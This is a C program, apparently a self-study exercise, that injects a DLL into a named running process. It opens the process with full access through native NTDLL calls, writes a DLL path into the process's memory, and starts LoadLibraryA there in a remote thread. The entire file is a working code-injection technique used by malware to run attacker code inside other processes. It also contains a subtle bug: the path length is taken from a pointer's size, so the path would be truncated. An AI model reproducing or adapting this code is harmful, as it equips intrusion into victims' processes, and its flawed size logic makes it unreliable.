#include "Functions.h"


int main(int ArgCount,char* ArgV[]){
    if (ArgCount < 2){
        printf("Enter the Process Name !");
        return 0;
    }

    int PID = GetProcID(ArgV[1]);
    HMODULE NT = GetModuleHandleW(L"NTDll");

    // Get process Handle 
    NtOpenProcess Open=(NtOpenProcess) GetProcAddress(NT,"NtOpenProcess");
    OBJECT_ATTRIBUTES OBJ = {(sizeof(OBJ)),NULL};
    CLIENT_ID CID = {(PVOID*)PID,NULL};
    HANDLE remoteProcess =NULL;
    NTSTATUS result = Open(&remoteProcess,PROCESS_ALL_ACCESS,&OBJ,&CID);
    if (result == (NTSTATUS)0x00000000L){
        printf("* Successfully got handle %p\n",remoteProcess);
    }
    else{ printf("& Error While Getting process handle, 0x%x\n",result); return 0;}



    // Allocate memory in remote process 
    NtAllocateVirtualMemory AllocateMem = (NtAllocateVirtualMemory) GetProcAddress(NT,"NtAllocateVirtualMemory");
   const char *DLL_Path ="C:\\Users\\sm6r\\Desktop\\Malware_Analysis\\Mine\\Dll injection\\Native API\\DLL Files\\theDLL.dll";
    SIZE_T pathSize = sizeof(DLL_Path);
    
    LPVOID DLLPATH =NULL;
    result = AllocateMem(remoteProcess,&DLLPATH,NULL,&pathSize,MEM_COMMIT, PAGE_READWRITE);
    if (result == (NTSTATUS)0x00000000L){
        printf("* Successfully Allocated memory at  %p\n",DLLPATH);
    }
    else{printf("& Error While Allocating memory, 0x%x\n",result);return 0;  }
  


    // Write into that memory 
    NtWriteVirtualMemory WriteMem = (NtWriteVirtualMemory) GetProcAddress(NT,"NtWriteVirtualMemory");
    size_t BytesWritten = 0;   
    result = WriteMem(remoteProcess,DLLPATH,(LPVOID)DLL_Path,pathSize,&BytesWritten);
    if (result == (NTSTATUS)0x00000000L){
        printf("* Successfully memory written , %d Bytes \n",BytesWritten);
    }
    else{ printf("&Error While Writing into memory , 0x%x\n\n",result); return 0; }




    // Get the routine (loadlibrary)
    PUSER_THREAD_START_ROUTINE Payload = (PUSER_THREAD_START_ROUTINE) GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"LoadLibraryA");
    // Create remote thread
    NtCreateThreadEx CreateThread = (NtCreateThreadEx) GetProcAddress(NT,"NtCreateThreadEx");
    HANDLE thread =NULL;
  
    result = CreateThread(&thread,THREAD_ALL_ACCESS,&OBJ,remoteProcess,Payload,DLLPATH,false,0,0,0,NULL);
    if (result == (NTSTATUS)0x00000000L){
        printf("thread was created with the handle %p\n",thread );
        }
    else{ printf("& Thread Error 0x%x\n",result); return 0;  }

    return 1;
}
